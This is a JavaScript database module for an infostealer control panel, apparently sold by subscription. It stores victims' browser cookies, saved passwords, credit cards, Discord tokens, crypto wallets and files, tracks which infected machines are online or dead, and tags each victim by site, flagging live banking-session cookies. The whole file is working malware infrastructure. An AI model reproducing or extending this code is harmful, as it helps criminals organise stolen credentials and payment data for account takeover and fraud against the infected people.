const Database = require('better-sqlite3');
const path = require('path');
const bcrypt = require('bcrypt');

const DB_PATH = path.join(__dirname, 'webpanel.db');

// Helper function to check if a cookie is non-expired
const isCookieNonExpired = (cookie) => {
    if (!cookie.expires && !cookie.expires_utc) return true; // Session cookies (no expiry) are valid
    
    try {
        let expiryTimestamp = cookie.expires || cookie.expires_utc;
        if (typeof expiryTimestamp === 'string') {
            const parsed = Date.parse(expiryTimestamp);
            if (!isNaN(parsed)) {
                expiryTimestamp = parsed / 1000;
            }
        }
        // Chrome stores expires_utc as microseconds since 1601
        if (expiryTimestamp > 13000000000000) {
            expiryTimestamp = (expiryTimestamp / 1000000) - 11644473600;
        }
        // If it's in seconds since 1970, compare with current time
        const currentTimestamp = Math.floor(Date.now() / 1000);
        return expiryTimestamp > currentTimestamp;
    } catch (e) {
        return true; // If parsing fails, assume it's valid
    }
};

// Function to extract tags from merged pcData
const extractTagsFromPcData = (pcData) => {
    const tags = [];
    if (!pcData) return tags;
    
    // Check for Discord tokens
    if (pcData.discordTokens && Array.isArray(pcData.discordTokens) && pcData.discordTokens.length > 0) {
        tags.push({ label: 'Discord (token)', color: '#5865F2' });
    }
    
    // Check browser history and cookies for sites
    const allUrls = [];
    const historyUrls = [];
    const cookieData = [];
    
    // Extract URLs from browser history
    if (pcData.browserHistory) {
        const history = pcData.browserHistory;
        ['chromeHistory', 'firefoxHistory', 'edgeHistory', 'operaHistory', 'braveHistory'].forEach(browser => {
            if (history[browser] && Array.isArray(history[browser])) {
                history[browser].forEach(entry => {
                    if (entry.url) {
                        const url = entry.url.toLowerCase();
                        allUrls.push(url);
                        historyUrls.push(url);
                    }
                });
            }
        });
    }
    
    // Extract domains from cookies with expiration info
    if (pcData.browserCookies) {
        let cookies = [];
        if (typeof pcData.browserCookies === 'string') {
            try {
                cookies = JSON.parse(pcData.browserCookies);
            } catch (e) {
                // If parsing fails, try to extract domains from string
                const domainMatches = pcData.browserCookies.match(/"domain"\s*:\s*"([^"]+)"/gi);
                if (domainMatches) {
                    domainMatches.forEach(match => {
                        const domainMatch = match.match(/"([^"]+)"$/);
                        if (domainMatch && domainMatch[1]) {
                            const domain = domainMatch[1].toLowerCase();
                            allUrls.push(domain);
                            cookieData.push({ domain: domain, expires: null });
                        }
                    });
                }
            }
        } else if (Array.isArray(pcData.browserCookies)) {
            cookies = pcData.browserCookies;
        }
        
        if (Array.isArray(cookies)) {
            cookies.forEach(cookie => {
                if (cookie.domain || cookie.host) {
                    const domain = (cookie.domain || cookie.host).toLowerCase();
                    allUrls.push(domain);
                    cookieData.push({
                        domain: domain,
                        expires: cookie.expires || cookie.expires_utc || null
                    });
                }
            });
        }
    }
    
    // Site detection patterns - sites that require non-expired cookies
    const cookieRequiredSites = {
        'G2G': ['g2g.com'],
        'G2A': ['g2a.com'],
        'Banking': [
            'chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citibank.com', 'usbank.com',
            'pnc.com', 'tdbank.com', 'capitalone.com', 'americanexpress.com', 'discover.com',
            'barclays.com', 'hsbc.com', 'jpmorgan.com', 'morganstanley.com', 'goldmansachs.com',
            'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'ally.com',
            'synchrony.com', 'regions.com', 'suntrust.com', 'bbt.com', 'keybank.com',
            'huntington.com', 'fifththird.com', 'm&t.com', 'citizensbank.com', 'td.com'
        ]
    };
    
    // Site detection patterns - sites that don't require cookie expiration check
    const sitePatterns = {
        'YouTube': ['youtube.com', 'youtu.be', 'youtube-nocookie.com'],
        'Microsoft': ['microsoft.com', 'office.com', 'outlook.com', 'live.com', 'hotmail.com', 'onedrive.com', 'azure.com', 'microsoftonline.com'],
        'Google': ['google.com', 'gmail.com', 'googlemail.com', 'googletagmanager.com', 'googleapis.com', 'googleusercontent.com'],
        'Facebook': ['facebook.com', 'fb.com', 'messenger.com'],
        'Twitter': ['twitter.com', 'x.com', 't.co'],
        'Instagram': ['instagram.com'],
        'TikTok': ['tiktok.com'],
        'Reddit': ['reddit.com'],
        'Amazon': ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr'],
        'Steam': ['steamcommunity.com', 'steampowered.com', 'steam-chat.com'],
        'Epic Games': ['epicgames.com', 'unrealengine.com'],
        'PayPal': ['paypal.com'],
        'GitHub': ['github.com'],
        'Netflix': ['netflix.com'],
        'Spotify': ['spotify.com'],
        'Discord': ['discord.com', 'discordapp.com', 'discord.gg'],
    };
    
    // Check cookie-required sites (only show if non-expired cookies exist)
    Object.keys(cookieRequiredSites).forEach(siteName => {
        const patterns = cookieRequiredSites[siteName];
        const foundInHistory = historyUrls.some(url => patterns.some(pattern => url.includes(pattern)));
        
        // Check if there are non-expired cookies for this site
        const hasNonExpiredCookie = cookieData.some(cookie => {
            const matchesDomain = patterns.some(pattern => cookie.domain.includes(pattern));
            return matchesDomain && isCookieNonExpired(cookie);
        });
        
        if ((foundInHistory || hasNonExpiredCookie) && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: siteName === 'Banking' ? '#ef4444' : '#60a5fa' });
        }
    });
    
    // Check for regular sites (from history or cookies, no expiration requirement)
    Object.keys(sitePatterns).forEach(siteName => {
        const patterns = sitePatterns[siteName];
        const found = allUrls.some(url => patterns.some(pattern => url.includes(pattern)));
        if (found && !tags.some(t => t.label.includes(siteName))) {
            tags.push({ label: siteName, color: '#60a5fa' });
        }
    });
    
    // Check for crypto wallets
    if (pcData.cryptoWallets && Array.isArray(pcData.cryptoWallets) && pcData.cryptoWallets.length > 0) {
        tags.push({ label: 'Crypto Wallet', color: '#f59e0b' });
    }
    
    return tags;
};

let db;
try {
    db = new Database(DB_PATH);
    console.log(`Database opened: ${DB_PATH}`);
} catch (error) {
    console.error('Failed to open database:', error);
    throw error;
}

// Enable foreign keys
try {
    db.pragma('foreign_keys = ON');
} catch (error) {
    console.error('Failed to enable foreign keys:', error);
}

// Initialize database schema
const initDatabase = () => {
    // Users table
    db.exec(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_login DATETIME,
            is_active INTEGER DEFAULT 1
        )
    `);

    // Login attempts table (for tracking login history)
    db.exec(`
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            ip_address TEXT,
            success INTEGER DEFAULT 0,
            attempted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            user_agent TEXT
        )
    `);

    // Logs table (for client logs)
    db.exec(`
        CREATE TABLE IF NOT EXISTS logs (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            ip TEXT,
            country TEXT,
            date DATETIME,
            data_summary TEXT,
            pc_data TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);
    
    // Migrate existing database: add session_id, updated_at, user, and notes columns if they don't exist
    // Check if columns exist using PRAGMA table_info (safer than SELECT)
    try {
        const columns = db.prepare("PRAGMA table_info(logs)").all();
        const columnNames = columns.map(col => col.name);
        const needsMigration = !columnNames.includes('session_id') || !columnNames.includes('updated_at') || !columnNames.includes('user') || !columnNames.includes('notes');
        
        if (needsMigration) {
            console.log('Migrating database schema: adding missing columns...');
            try {
                if (!columnNames.includes('session_id')) {
                    db.exec('ALTER TABLE logs ADD COLUMN session_id TEXT');
                }
                if (!columnNames.includes('updated_at')) {
                    // SQLite doesn't support CURRENT_TIMESTAMP as default in ALTER TABLE
                    // We'll add the column without default and set it manually if needed
                    db.exec('ALTER TABLE logs ADD COLUMN updated_at DATETIME');
                    // Update existing rows to have current timestamp
                    db.exec('UPDATE logs SET updated_at = CURRENT_TIMESTAMP WHERE updated_at IS NULL');
                }
                if (!columnNames.includes('user')) {
                    db.exec('ALTER TABLE logs ADD COLUMN user TEXT');
                }
                if (!columnNames.includes('notes')) {
                    db.exec('ALTER TABLE logs ADD COLUMN notes TEXT');
                }
                console.log('Database migration completed successfully');
            } catch (migrationError) {
                console.error('Database migration error:', migrationError.message);
                console.error('Migration error stack:', migrationError.stack);
            }
        }
    } catch (error) {
        console.error('Error checking database schema:', error.message);
    }
    
    // Migrate users table: add subscription fields
    try {
        const userColumns = db.prepare("PRAGMA table_info(users)").all();
        const userColumnNames = userColumns.map(col => col.name);
        
        if (!userColumnNames.includes('subscription_expires')) {
            console.log('Adding subscription fields to users table...');
            db.exec('ALTER TABLE users ADD COLUMN subscription_expires DATETIME');
            db.exec('ALTER TABLE users ADD COLUMN subscription_type TEXT DEFAULT "none"');
            console.log('Subscription fields added successfully');
        }
    } catch (error) {
        console.error('Error adding subscription fields:', error.message);
    }
    
    // Create indexes for faster lookups (after migration)
    // Check if columns exist before creating indexes
    try {
        const columns = db.prepare("PRAGMA table_info(logs)").all();
        const columnNames = columns.map(col => col.name);
        
        // Always try to create session_id index (it should exist after migration)
        db.exec('CREATE INDEX IF NOT EXISTS idx_logs_session_id ON logs(session_id)');
        
        // Only create user index if user column exists
        if (columnNames.includes('user')) {
            db.exec('CREATE INDEX IF NOT EXISTS idx_logs_user ON logs(user)');
        }
    } catch (indexError) {
        console.error('Error creating indexes:', indexError.message);
    }

    // Create indexes for better performance
    db.exec(`
        CREATE INDEX IF NOT EXISTS idx_logs_date ON logs(date);
        CREATE INDEX IF NOT EXISTS idx_logs_ip ON logs(ip);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_username ON login_attempts(username);
        CREATE INDEX IF NOT EXISTS idx_login_attempts_attempted_at ON login_attempts(attempted_at);
    `);

    // Initialize default admin user if no users exist (only from environment variables)
    const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
    if (userCount.count === 0) {
        const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME;
        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD;
        
        if (!defaultUsername || !defaultPassword) {
            console.warn('⚠️  WARNING: No users exist and DEFAULT_ADMIN_USERNAME/DEFAULT_ADMIN_PASSWORD not set in .env');
            console.warn('   Please set these environment variables to create the initial admin user.');
            console.warn('   Or use the database management script: node manage-db.js create-user <username> <password>');
            return;
        }
        
        // Hash password with bcrypt (includes automatic salting)
        // bcrypt automatically generates a unique salt for each password
        const passwordHash = bcrypt.hashSync(defaultPassword, 10);
        
        db.prepare(`
            INSERT INTO users (username, password_hash)
            VALUES (?, ?)
        `).run(defaultUsername, passwordHash);
        
        console.log(`Default admin user created from environment variables. Username: ${defaultUsername}`);
        console.log('⚠️  IMPORTANT: Change the default password immediately after first login!');
    }

    console.log('Database initialized successfully');
};

// User operations
const userDb = {
    findByUsername: (username) => {
        return db.prepare('SELECT * FROM users WHERE username = ? AND is_active = 1').get(username);
    },
    
    create: (username, passwordHash) => {
        try {
            const result = db.prepare(`
                INSERT INTO users (username, password_hash, subscription_type)
                VALUES (?, ?, 'none')
            `).run(username, passwordHash);
            return { id: result.lastInsertRowid, username };
        } catch (error) {
            if (error.code === 'SQLITE_CONSTRAINT_UNIQUE') {
                throw new Error('Username already exists');
            }
            throw error;
        }
    },
    
    updatePassword: (username, passwordHash) => {
        const result = db.prepare(`
            UPDATE users 
            SET password_hash = ?
            WHERE username = ?
        `).run(passwordHash, username);
        return result.changes > 0;
    },
    
    updateLastLogin: (username) => {
        db.prepare(`
            UPDATE users 
            SET last_login = CURRENT_TIMESTAMP
            WHERE username = ?
        `).run(username);
    },
    
    getAll: () => {
        return db.prepare('SELECT id, username, created_at, last_login, is_active, subscription_expires, subscription_type FROM users').all();
    },
    
    // Subscription methods
    getSubscription: (username) => {
        const user = db.prepare('SELECT subscription_expires, subscription_type FROM users WHERE username = ?').get(username);
        if (!user) return null;
        
        const now = new Date();
        const expires = user.subscription_expires ? new Date(user.subscription_expires) : null;
        const isActive = expires && expires > now;
        
        return {
            type: user.subscription_type || 'none',
            expires: user.subscription_expires,
            isActive: isActive,
            daysRemaining: isActive ? Math.ceil((expires - now) / (1000 * 60 * 60 * 24)) : 0
        };
    },
    
    setSubscription: (username, days, type = 'standard') => {
        const expiresDate = new Date();
        expiresDate.setDate(expiresDate.getDate() + days);
        const expiresStr = expiresDate.toISOString();
        
        const result = db.prepare(`
            UPDATE users 
            SET subscription_expires = ?, subscription_type = ?
            WHERE username = ?
        `).run(expiresStr, type, username);
        return result.changes > 0;
    },
    
    addSubscriptionDays: (username, days) => {
        const user = db.prepare('SELECT subscription_expires FROM users WHERE username = ?').get(username);
        if (!user) return false;
        
        let baseDate = new Date();
        // If user has active subscription, add to existing expiry
        if (user.subscription_expires) {
            const existingExpires = new Date(user.subscription_expires);
            if (existingExpires > baseDate) {
                baseDate = existingExpires;
            }
        }
        
        baseDate.setDate(baseDate.getDate() + days);
        const expiresStr = baseDate.toISOString();
        
        const result = db.prepare(`
            UPDATE users 
            SET subscription_expires = ?
            WHERE username = ?
        `).run(expiresStr, username);
        return result.changes > 0;
    },
    
    removeSubscription: (username) => {
        const result = db.prepare(`
            UPDATE users 
            SET subscription_expires = NULL, subscription_type = 'none'
            WHERE username = ?
        `).run(username);
        return result.changes > 0;
    },
    
    hasActiveSubscription: (username) => {
        const sub = userDb.getSubscription(username);
        return sub && sub.isActive;
    }
};

// Login attempts operations
const loginAttemptsDb = {
    create: (username, ipAddress, success, userAgent) => {
        db.prepare(`
            INSERT INTO login_attempts (username, ip_address, success, user_agent)
            VALUES (?, ?, ?, ?)
        `).run(username, ipAddress, success ? 1 : 0, userAgent);
    },
    
    getRecentAttempts: (username, minutes = 15) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            WHERE username = ? AND attempted_at > datetime('now', '-' || ? || ' minutes')
            ORDER BY attempted_at DESC
        `).all(username, minutes);
    },
    
    getAll: (limit = 100) => {
        return db.prepare(`
            SELECT * FROM login_attempts
            ORDER BY attempted_at DESC
            LIMIT ?
        `).all(limit);
    }
};

// Logs operations
const logsDb = {
    createOrUpdate: (logData) => {
        try {
            const { id, sessionId, ip, country, date, dataSummary, pcData, user } = logData;
            
            // Check if log exists by session_id
            let existingLog = null;
            if (sessionId) {
                existingLog = db.prepare('SELECT * FROM logs WHERE session_id = ?').get(sessionId);
            }
            
            if (existingLog) {
            // Merge with existing log
            const existingPcData = JSON.parse(existingLog.pc_data || '{}');
            const existingDataSummary = JSON.parse(existingLog.data_summary || '{}');
            
            // Helper function to check if a value is actually provided (not just undefined)
            const hasValue = (val) => val !== undefined && val !== null;
            
            // Helper function to check if array has meaningful data
            const hasArrayData = (arr) => Array.isArray(arr) && arr.length > 0;
            
            // Helper function to check if browserHistory has data
            const hasHistoryData = (bh) => {
                if (!bh || typeof bh !== 'object') return false;
                return (bh.chromeHistory?.length > 0) ||
                       (bh.firefoxHistory?.length > 0) ||
                       (bh.edgeHistory?.length > 0) ||
                       (bh.operaHistory?.length > 0) ||
                       (bh.braveHistory?.length > 0);
            };
            
            // Merge pcData - use new data if provided and has content, otherwise keep existing
            const mergedPcData = {
                ...existingPcData,
                // Override with new values if they are provided
                screenSize: hasValue(pcData.screenSize) ? pcData.screenSize : existingPcData.screenSize,
                dateTime: hasValue(pcData.dateTime) ? pcData.dateTime : existingPcData.dateTime,
                ipAddress: hasValue(pcData.ipAddress) ? pcData.ipAddress : existingPcData.ipAddress,
                location: hasValue(pcData.location) ? pcData.location : existingPcData.location,
                systemInfo: hasValue(pcData.systemInfo) ? pcData.systemInfo : existingPcData.systemInfo,
                // For browserCookies: use new value if provided (even if empty/null), otherwise keep existing
                // This ensures cookies are preserved when sent in later chunks
                browserCookies: hasValue(pcData.browserCookies) 
                    ? pcData.browserCookies  // Use new value if provided (could be array, string, or null)
                    : (existingPcData.browserCookies || null),  // Keep existing if new chunk doesn't have cookies
                // For arrays: use new data if it has items, otherwise keep existing (don't overwrite with empty)
                runningProcesses: hasArrayData(pcData.runningProcesses) 
                    ? pcData.runningProcesses 
                    : (hasArrayData(existingPcData.runningProcesses) 
                        ? existingPcData.runningProcesses 
                        : []),
                installedApps: hasArrayData(pcData.installedApps) 
                    ? pcData.installedApps 
                    : (hasArrayData(existingPcData.installedApps) 
                        ? existingPcData.installedApps 
                        : []),
                browserHistory: hasHistoryData(pcData.browserHistory) 
                    ? pcData.browserHistory 
                    : (hasHistoryData(existingPcData.browserHistory) 
                        ? existingPcData.browserHistory 
                        : {}),
                discordTokens: (hasValue(pcData.discordTokens) && hasArrayData(pcData.discordTokens))
                    ? pcData.discordTokens 
                    : (hasArrayData(existingPcData.discordTokens) 
                        ? existingPcData.discordTokens 
                        : null),
                cryptoWallets: (hasValue(pcData.cryptoWallets) && hasArrayData(pcData.cryptoWallets))
                    ? pcData.cryptoWallets 
                    : (hasArrayData(existingPcData.cryptoWallets) 
                        ? existingPcData.cryptoWallets 
                        : null),
                cryptoWalletFolders: (hasValue(pcData.cryptoWalletFolders) && hasArrayData(pcData.cryptoWalletFolders))
                    ? pcData.cryptoWalletFolders 
                    : (hasArrayData(existingPcData.cryptoWalletFolders) 
                        ? existingPcData.cryptoWalletFolders 
                        : null),
                // Saved passwords: use new data if it has items, otherwise keep existing
                savedPasswords: (hasValue(pcData.savedPasswords) && hasArrayData(pcData.savedPasswords))
                    ? pcData.savedPasswords
                    : (hasArrayData(existingPcData.savedPasswords)
                        ? existingPcData.savedPasswords
                        : null),
                // Credit cards: use new data if it has items, otherwise keep existing
                creditCards: (hasValue(pcData.creditCards) && hasArrayData(pcData.creditCards))
                    ? pcData.creditCards
                    : (hasArrayData(existingPcData.creditCards)
                        ? existingPcData.creditCards
                        : null),
                // Autofill addresses: use new data if it has items, otherwise keep existing
                autofillAddresses: (hasValue(pcData.autofillAddresses) && hasArrayData(pcData.autofillAddresses))
                    ? pcData.autofillAddresses
                    : (hasArrayData(existingPcData.autofillAddresses)
                        ? existingPcData.autofillAddresses
                        : null),
                // Important files: use new data if it has items, otherwise keep existing
                importantFiles: (hasValue(pcData.importantFiles) && hasArrayData(pcData.importantFiles))
                    ? pcData.importantFiles
                    : (hasArrayData(existingPcData.importantFiles)
                        ? existingPcData.importantFiles
                        : null)
            };
            
            // Recalculate dataSummary from merged data to get accurate counts
            let totalHistoryEntries = 0;
            if (mergedPcData.browserHistory) {
                totalHistoryEntries += mergedPcData.browserHistory.chromeHistory?.length || 0;
                totalHistoryEntries += mergedPcData.browserHistory.firefoxHistory?.length || 0;
                totalHistoryEntries += mergedPcData.browserHistory.edgeHistory?.length || 0;
                totalHistoryEntries += mergedPcData.browserHistory.operaHistory?.length || 0;
                totalHistoryEntries += mergedPcData.browserHistory.braveHistory?.length || 0;
            }
            
            // Calculate cookie count from merged data
            let cookieCount = 0;
            if (mergedPcData.browserCookies) {
                if (typeof mergedPcData.browserCookies === 'string') {
                    try {
                        const parsed = JSON.parse(mergedPcData.browserCookies);
                        cookieCount = Array.isArray(parsed) ? parsed.length : Object.keys(parsed).length;
                    } catch (e) {
                        cookieCount = 0;
                    }
                } else if (Array.isArray(mergedPcData.browserCookies)) {
                    cookieCount = mergedPcData.browserCookies.length;
                }
            }
            
            // Extract tags from merged data
            const mergedTags = extractTagsFromPcData(mergedPcData);
            
            const mergedDataSummary = {
                historyEntries: totalHistoryEntries,
                processes: (mergedPcData.runningProcesses || []).length,
                installedApps: (mergedPcData.installedApps || []).length,
                cookies: cookieCount,
                tags: mergedTags
            };
            
            console.log(`Merged log summary - cookies: ${cookieCount}, browserCookies type: ${typeof mergedPcData.browserCookies}, isArray: ${Array.isArray(mergedPcData.browserCookies)}`);
            
            // Extract country from merged location data if available (even if top-level country is "Unknown")
            // This ensures that when location data arrives in a later chunk, we update the country correctly
            let finalCountry = country || existingLog.country;
            if (mergedPcData.location?.countryName && mergedPcData.location.countryName !== 'Unknown') {
                finalCountry = mergedPcData.location.countryName;
                console.log(`Updating country from location data: ${finalCountry}`);
            } else if (country && country !== 'Unknown') {
                finalCountry = country;
            }
            
            // Update the log - check if updated_at column exists first
            let updateQuery = `
                UPDATE logs 
                SET ip = ?, country = ?, date = ?, data_summary = ?, pc_data = ?
            `;
            const updateParams = [
                ip || existingLog.ip,
                finalCountry,
                date || existingLog.date,
                JSON.stringify(mergedDataSummary),
                JSON.stringify(mergedPcData)
            ];
            
            // Check if updated_at and user columns exist
            try {
                const columns = db.prepare("PRAGMA table_info(logs)").all();
                const columnNames = columns.map(col => col.name);
                const hasUpdatedAt = columnNames.includes('updated_at');
                const hasUser = columnNames.includes('user');
                
                if (hasUpdatedAt) {
                    updateQuery += `, updated_at = CURRENT_TIMESTAMP`;
                }
                // Always update user field if column exists and we have a user value
                // If user is null but column exists, set it to null (for backward compatibility)
                if (hasUser) {
                    updateQuery += `, user = ?`;
                    updateParams.push(user || null);
                }
            } catch (e) {
                // If we can't check, just proceed without updated_at/user
            }
            
            updateQuery += ` WHERE session_id = ?`;
            updateParams.push(sessionId);
            
            db.prepare(updateQuery).run(...updateParams);
            
            console.log(`Updated log ${existingLog.id}: ${mergedDataSummary.processes} processes, ${mergedDataSummary.installedApps} apps, ${mergedDataSummary.historyEntries} history entries`);
            
            return existingLog.id;
        } else {
                    // Create new log - check if user column exists
                    try {
                        const columns = db.prepare("PRAGMA table_info(logs)").all();
                        const columnNames = columns.map(col => col.name);
                        const hasUser = columnNames.includes('user');
                        
                        if (hasUser) {
                            db.prepare(`
                                INSERT INTO logs (id, session_id, ip, country, date, data_summary, pc_data, user)
                                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                            `).run(
                                id,
                                sessionId,
                                ip,
                                country,
                                date,
                                JSON.stringify(dataSummary),
                                JSON.stringify(pcData),
                                user || null
                            );
                        } else {
                            db.prepare(`
                                INSERT INTO logs (id, session_id, ip, country, date, data_summary, pc_data)
                                VALUES (?, ?, ?, ?, ?, ?, ?)
                            `).run(
                                id,
                                sessionId,
                                ip,
                                country,
                                date,
                                JSON.stringify(dataSummary),
                                JSON.stringify(pcData)
                            );
                        }
                    } catch (e) {
                        // Fallback
                        db.prepare(`
                            INSERT INTO logs (id, session_id, ip, country, date, data_summary, pc_data)
                            VALUES (?, ?, ?, ?, ?, ?, ?)
                        `).run(
                            id,
                            sessionId,
                            ip,
                            country,
                            date,
                            JSON.stringify(dataSummary),
                            JSON.stringify(pcData)
                        );
                    }
            return id;
            }
        } catch (error) {
            console.error('Error in createOrUpdate:', error);
            console.error('Error stack:', error.stack);
            throw error;
        }
    },
    
    create: (logData) => {
        // Legacy method for backward compatibility
        return this.createOrUpdate(logData);
    },
    
    getAll: () => {
        // Optimize: Only select needed columns, exclude large pc_data for list view
        const logs = db.prepare('SELECT id, ip, country, date, user, data_summary, notes FROM logs ORDER BY date DESC').all();
        return logs.map(log => ({
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            user: log.user || null,
            notes: log.notes || null,
            dataSummary: JSON.parse(log.data_summary || '{}')
            // Note: pcData excluded for performance - only loaded when viewing details
        }));
    },
    
    getById: (logId) => {
        const log = db.prepare('SELECT * FROM logs WHERE id = ?').get(logId);
        if (!log) return null;
        return {
            id: log.id,
            ip: log.ip,
            country: log.country,
            date: log.date,
            notes: log.notes || null,
            dataSummary: JSON.parse(log.data_summary || '{}'),
            pcData: JSON.parse(log.pc_data || '{}')
        };
    },
    
    updateNotes: (logId, notes) => {
        try {
            const columns = db.prepare("PRAGMA table_info(logs)").all();
            const columnNames = columns.map(col => col.name);
            if (!columnNames.includes('notes')) {
                db.exec('ALTER TABLE logs ADD COLUMN notes TEXT');
            }
            const result = db.prepare('UPDATE logs SET notes = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(notes || null, logId);
            return result.changes > 0;
        } catch (error) {
            console.error('Error updating notes:', error);
            throw error;
        }
    },
    
    deleteByIds: (logIds) => {
        const placeholders = logIds.map(() => '?').join(',');
        const result = db.prepare(`DELETE FROM logs WHERE id IN (${placeholders})`).run(...logIds);
        return result.changes;
    },
    
    deleteByIdsForUser: (logIds, username) => {
        // Check if user column exists
        try {
            const columns = db.prepare("PRAGMA table_info(logs)").all();
            const columnNames = columns.map(col => col.name);
            const hasUser = columnNames.includes('user');
            
            if (hasUser) {
                // Only delete logs that belong to this user
                const placeholders = logIds.map(() => '?').join(',');
                const result = db.prepare(`
                    DELETE FROM logs 
                    WHERE id IN (${placeholders}) AND user = ?
                `).run(...logIds, username);
                return result.changes;
            } else {
                // If user column doesn't exist, allow deletion (backward compatibility)
                const placeholders = logIds.map(() => '?').join(',');
                const result = db.prepare(`DELETE FROM logs WHERE id IN (${placeholders})`).run(...logIds);
                return result.changes;
            }
        } catch (error) {
            console.error('Error checking user column:', error);
            // Fallback: allow deletion if we can't check
            const placeholders = logIds.map(() => '?').join(',');
            const result = db.prepare(`DELETE FROM logs WHERE id IN (${placeholders})`).run(...logIds);
            return result.changes;
        }
    },
    
    getStats: () => {
        const totalLogs = db.prepare('SELECT COUNT(*) as count FROM logs').get().count;
        
        const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
        const oneHourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
        
        const uniqueIps = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count FROM logs
        `).get().count;
        
        const onlineClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date > ?
        `).get(fiveMinutesAgo).count;
        
        const deadClients = db.prepare(`
            SELECT COUNT(DISTINCT ip) as count 
            FROM logs 
            WHERE date < ?
        `).get(oneHourAgo).count;
        
        return {
            totalLogs,
            allClients: uniqueIps,
            onlineClients,
            deadClients
        };
    },
    
    // Regenerate tags for all logs that don't have them
    regenerateTags: () => {
        try {
            const logs = db.prepare('SELECT id, data_summary, pc_data FROM logs').all();
            let updated = 0;
            
            logs.forEach(log => {
                try {
                    const dataSummary = JSON.parse(log.data_summary || '{}');
                    const pcData = JSON.parse(log.pc_data || '{}');
                    
                    // Regenerate tags from pcData
                    const tags = extractTagsFromPcData(pcData);
                    dataSummary.tags = tags;
                    
                    // Update the log
                    db.prepare('UPDATE logs SET data_summary = ? WHERE id = ?').run(
                        JSON.stringify(dataSummary),
                        log.id
                    );
                    updated++;
                } catch (e) {
                    console.error(`Error regenerating tags for log ${log.id}:`, e);
                }
            });
            
            console.log(`Regenerated tags for ${updated} logs`);
            return updated;
        } catch (error) {
            console.error('Error in regenerateTags:', error);
            throw error;
        }
    }
};

// Initialize database on module load
try {
    initDatabase();
    
    // Auto-migrate: Regenerate tags for logs that don't have them
    console.log('Checking for logs without tags...');
    const logsWithoutTags = db.prepare(`
        SELECT COUNT(*) as count FROM logs 
        WHERE data_summary NOT LIKE '%"tags":%' OR data_summary IS NULL
    `).get().count;
    
    if (logsWithoutTags > 0) {
        console.log(`Found ${logsWithoutTags} logs without tags, regenerating...`);
        logsDb.regenerateTags();
    } else {
        console.log('All logs have tags.');
    }
} catch (error) {
    console.error('Failed to initialize database:', error);
    console.error('Stack trace:', error.stack);
    process.exit(1);
}

module.exports = {
    db,
    userDb,
    loginAttemptsDb,
    logsDb
};

